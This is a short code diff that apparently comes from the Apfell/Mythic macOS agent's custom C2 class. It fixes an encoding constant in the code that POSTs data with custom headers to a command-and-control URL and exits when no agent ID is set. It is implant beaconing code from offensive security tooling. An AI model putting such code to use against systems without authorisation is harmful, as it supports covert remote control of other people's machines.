@@ -292,7 +292,7 @@ class customC2 extends baseC2{
 				if( (apfell.id === undefined || apfell.id === "") && (uid === undefined || uid === "")){ $.NSApplication.sharedApplication.terminate(this);}
 				let req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
 				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
-				let postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
+				let postData = data.dataUsingEncodingAllowLossyConversion($.NSASCIIStringEncoding, true);
 				let postLength = $.NSString.stringWithFormat("%d", postData.length);
 				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
 				for(let i = 0; i < this.header_list.length; i++){
